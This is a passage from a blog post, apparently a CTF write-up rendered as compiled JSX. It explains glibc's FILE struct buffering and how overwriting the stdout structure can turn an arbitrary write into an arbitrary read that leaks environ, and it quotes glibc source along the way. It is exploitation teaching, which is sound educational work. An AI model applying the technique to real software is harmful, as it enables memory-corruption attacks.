class-name\",children:\"size_t\"}),\" __pad5\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"int\"}),\" _mode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Make sure we don\\u2019t get into trouble again.  */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" _unused2\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"sizeof\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"int\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"4\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"sizeof\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"void\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"sizeof\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token class-name\",children:\"size_t\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"This struct has several fields, several managing \",(0,n.jsx)(e.em,{children:\"buffering\"}),\". That function, that every CTF challenge (including this one), \",(0,n.jsx)(e.code,{children:\"setbuf\"}),\", is a function that updates fields in this struct. Buffering is a great speedup, since calling syscalls every time you want to write a character to the screen, sequentially, is \",(0,n.jsx)(e.em,{children:\"slow\"}),'. It\\u2019s much faster to just write to a buffer for a bit, and eventually flush that buffer to the file descriptor. It might be feasible to hijack what these buffers are doing, and get a \"read what where\" primative out of it!']}),`\n`,(0,n.jsx)(e.p,{children:\"Let\\u2019s view each fields and disect them:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_read_ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Current read pointer */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_read_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* End of get area. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_read_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Start of putback+get area. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_write_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Start of put area. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_write_ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Current put pointer. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_write_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* End of put area. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_buf_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Start of reserve area. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_buf_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* End of reserve area. */\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:'These fields are somewhat self explanitory: an IO FILE struct maintains pointers to buffers that hold read and write information, specifically denotating where a \"cursor\" is in each buffer, and where those buffers end. The buffering structure can somewhat be visualized like below. However, often these structures can overlap depending on what is happening with the file descriptor.'}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`[a a a a a a a _ _ _ _ _ _ _ b b b b b b b c _ _ _ _ _ _ _ ]\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:` ^             ^           ^ ^                 ^         ^\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:` read_base     read_ptr    read_end\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`                             write_base        write_ptr write_end\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:` buf_base                                                buf_end\n`})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"We have fields \",(0,n.jsx)(e.code,{children:\"int _flags\"}),\", \",(0,n.jsx)(e.code,{children:\"int _fileno\"}),\", \",(0,n.jsx)(e.code,{children:\"__off64_t _offset\"}),\", \",(0,n.jsx)(e.code,{children:\"FILE* _chain\"}),\", \",(0,n.jsx)(e.code,{children:\"char _vtable_offset\"}),\":\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"flags\"}),\" is all of the flags that this file descriptor uses, its meant to only be 32 bits, and the top 2 bytes are set to \",(0,n.jsx)(e.code,{children:\"_IO_MAGIC\"}),\" or \",(0,n.jsx)(e.code,{children:\"0xFBAD0000\"}),\".\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"fileno\"}),\" is the actual, integer file descriptor for this \",(0,n.jsx)(e.code,{children:\"FILE\"}),\".\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"offset\"}),\" is the byte offset within the file (used for seeking and such).\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"chain\"}),\" is a pointer to the next \",(0,n.jsx)(e.code,{children:\"FILE*\"}),\", as they are all managed in a singly-linked list.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"vtable_offset\"}),\" is the offset selector of which vtable we should use for this file pointer. A vtable is a struct containing function ptrs, so that it\\u2019s easy to share functions between different structs.\"]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"So what exactly do we have to do? For starters, if you\\u2019ve used \",(0,n.jsx)(e.code,{children:\"fgets()\"}),\" or other functions, then the \",(0,n.jsx)(e.code,{children:\"FILE*\"}),\" for \",(0,n.jsx)(e.code,{children:\"stdout\"}),\" is already defined and called \",(0,n.jsx)(e.code,{children:\"stdout\"}),\" when you use it in your code (compared to \",(0,n.jsx)(e.code,{children:\"STDOUT_FILENO\"}),\" referring to the file descriptor). libc stores a reference to the \",(0,n.jsx)(e.code,{children:\"FILE stdout\"}),\" in a symbol: \",(0,n.jsx)(e.code,{children:\"_IO_2_1_stdout_\"}),\". Which means, using the arbitrary write primative we built earlier with botcake, we can instead write to the file struct for stdout. But what do we write? We can easily set the flags and buffers to whatever we need, but how does give us an aribtrary read?\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Well, with buffering, eventually \",(0,n.jsx)(e.code,{children:\"stdout\"}),\" has to flush the buffer and whatever is in it to the terminal. If we can set up the flags and the buffers in such a way that both prints out \",(0,n.jsx)(e.code,{children:\"environ\"}),\", without breaking \",(0,n.jsx)(e.code,{children:\"stdout\"}),\", we have a working arbitrary read primative. I\\u2019m heavily following \",(0,n.jsx)(e.a,{href:\"https://ret2school.github.io/post/catastrophe/\",children:\"ret2school\"}),\" at this point, adding my own explainations when necessary.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"For core functions like \",(0,n.jsx)(e.code,{children:\"putc\"}),\", there are cases where it will instead flush the buffer and print something else. One of the macros in the \",(0,n.jsx)(e.code,{children:\"FILE.h\"}),\" struct definition is the following:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[(0,n.jsx)(e.span,{className:\"token directive-hash\",children:\"#\"}),(0,n.jsx)(e.span,{className:\"token directive keyword\",children:\"define\"}),\" \",(0,n.jsx)(e.span,{className:\"token macro-name function\",children:\"__putc_unlocked_body\"}),(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_ch\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" _fp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"\t\t\t\t\t\"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"  \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"__glibc_unlikely\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_fp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_ptr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\">=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_fp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"\t\"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"   \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token operator\",children:\"?\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"__overflow\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_fp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"unsigned\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_ch\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"\t\t\t\t\"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"   \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"unsigned\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_fp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_ptr\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"++\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_ch\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"})]})]}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"This macro is called by \",(0,n.jsx)(e.code,{children:\"fputc\"}),\" and \",(0,n.jsx)(e.code,{children:\"putchar\"}),\" (the latter, used with stdout). This checks to see if the file pointer\\u2019s write ptr is at or past the end of the write buffer. If so, then we call this \",(0,n.jsx)(e.code,{children:\"__overflow\"}),\" function, otherwise, we write the character to the current position of the write ptr and increment (Recall that postfix \",(0,n.jsx)(e.code,{children:\"++\"}),\" returns the value before incrementing, I love C).\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Alright, \",(0,n.jsx)(e.code,{children:\"__overflow\"}),\" will likely flush the buffer, so our first condition is to make the \",(0,n.jsx)(e.code,{children:\"write_ptr\"}),\" equal the \",(0,n.jsx)(e.code,{children:\"write_end\"}),\". Let\\u2019s take a look at \",(0,n.jsx)(e.code,{children:\"__overflow\"}),\" to see what else we need to consider:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"int\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token function\",children:\"__overflow\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"FILE \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"int\"}),\" ch\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* This is a single-byte stream.  */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_mode \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_fwide\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_OVERFLOW\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" ch\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"We can assume \",(0,n.jsx)(e.code,{children:\"_mode\"}),\" for stdout is assumed to be non-zero (since it\\u2019s not a single byte stream) This means we should look at \",(0,n.jsx)(e.code,{children:\"_IO_OVERFLOW\"}),\":\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"//libio/libioP.h#L146\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsxs)(e.span,{className:\"token macro property\",children:[(0,n.jsx)(e.span,{className:\"token directive-hash\",children:\"#\"}),(0,n.jsx)(e.span,{className:\"token directive keyword\",children:\"define\"}),\" \",(0,n.jsx)(e.span,{className:\"token macro-name function\",children:\"_IO_OVERFLOW\"}),(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"FP\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" CH\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"JUMP1\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"__overflow\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" FP\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" CH\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"})]})]}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"// Ok so let\\u2019s look at JUMP1: FUNC=__overflow, THIS=stdout, X1=our character\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"//libio/libioP.h#L124\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsxs)(e.span,{className:\"token macro property\",children:[(0,n.jsx)(e.span,{className:\"token directive-hash\",children:\"#\"}),(0,n.jsx)(e.span,{className:\"token directive keyword\",children:\"define\"}),\" \",(0,n.jsx)(e.span,{className:\"token macro-name function\",children:\"JUMP1\"}),(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"FUNC\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" THIS\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" X1\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_JUMPS_FUNC\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"THIS\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"FUNC\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"THIS\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" X1\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"})]})]}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"// Oh jeez: Ok so this grabs the corresponding vtable IO_jump_t, based off of the offset, and the previous macro dereferences the correct function...\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"//libio/libioP.h#L107\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[(0,n.jsx)(e.span,{className:\"token directive-hash\",children:\"#\"}),\" \",(0,n.jsx)(e.span,{className:\"token directive keyword\",children:\"define\"}),\" \",(0,n.jsx)(e.span,{className:\"token macro-name function\",children:\"_IO_JUMPS_FUNC\"}),(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"THIS\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"  \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"IO_validate_vtable                                                   \"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"   \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"struct\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"_IO_jump_t\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"void\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"&\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_JUMPS_FILE_plus\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"THIS\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"\t\"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"\t\t\t     \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"THIS\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_vtable_offset\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"})]})]}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"// And now we have the symbol we care about, _IO_file_overflow\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"//libio/fileops.c#L1426\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"const\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"struct\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"_IO_jump_t\"}),\" _IO_file_jumps libio_vtable \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  JUMP_INIT_DUMMY\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"JUMP_INIT\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"finish\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" _IO_file_finish\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"JUMP_INIT\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"overflow\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" _IO_file_overflow\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"JUMP_INIT\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"underflow\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" _IO_file_underflow\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Macro chasing in glibc is usually a nightmare. Let\\u2019s look at \",(0,n.jsx)(e.code,{children:\"_IO_file_overflow\"}),\" now:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"//libio/fileops.c#L730\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"int\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_new_file_overflow\"}),\" 